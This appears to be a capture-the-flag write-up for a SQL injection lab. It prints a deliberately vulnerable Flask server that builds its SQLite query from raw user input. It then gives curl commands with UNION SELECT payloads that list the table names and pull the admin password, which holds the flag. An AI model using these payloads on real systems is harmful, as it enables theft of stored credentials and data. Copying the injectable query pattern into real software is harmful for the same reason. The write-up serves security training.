# SQLi 4

```cat /challenge/server```

```
hacker@web-security~sqli-4:~$ cat /challenge/server
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import random
import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")


@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:
        # https://www.sqlite.org/schematab.html
        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
hacker@web-security~sqli-4:~$
```

-------------------------------------------------------------

#### Since the name of the table needed to inject is unknown, first step is finding the table names and getting the right one.


```
curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type=%22table"
```

------------------------------------------------------

#### In the results just one table was returned, so this is obviously it.


```
<html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='"UNION SELECT name FROM sqlite_master WHERE type="table'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE ""UNION SELECT name FROM sqlite_master WHERE type="table"</pre><br>
        <b>Results:</b><pre>users_4728253993</pre>
        </body></html>
* shutting down connection #0
```

---------------------------------------------

#### Craft the UNION SELECT request with the table name:


```
curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20password%20FROM%20user
s_4728253993%20WHERE%20username=%22admin"
```
